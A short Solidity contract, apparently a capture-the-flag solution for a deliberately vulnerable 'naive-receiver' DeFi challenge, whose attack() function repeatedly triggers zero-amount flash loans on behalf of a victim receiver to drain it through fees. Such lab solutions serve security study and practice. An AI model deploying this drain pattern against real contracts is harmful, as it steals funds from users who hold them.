// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import {NaiveReceiverLenderPool} from "src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";
import {FlashLoanReceiver} from "src/Contracts/naive-receiver/FlashLoanReceiver.sol";

contract AttackContract {
    NaiveReceiverLenderPool Pool;
    address payable receiver;

    constructor(address payable _Pool, address payable _receiver) {
        Pool = NaiveReceiverLenderPool(_Pool);
        receiver = _receiver;
    }

    function attack() external {
        for (uint256 i = 1; i <= 10; i++) {
            Pool.flashLoan(receiver, 0);
        }
    }
}
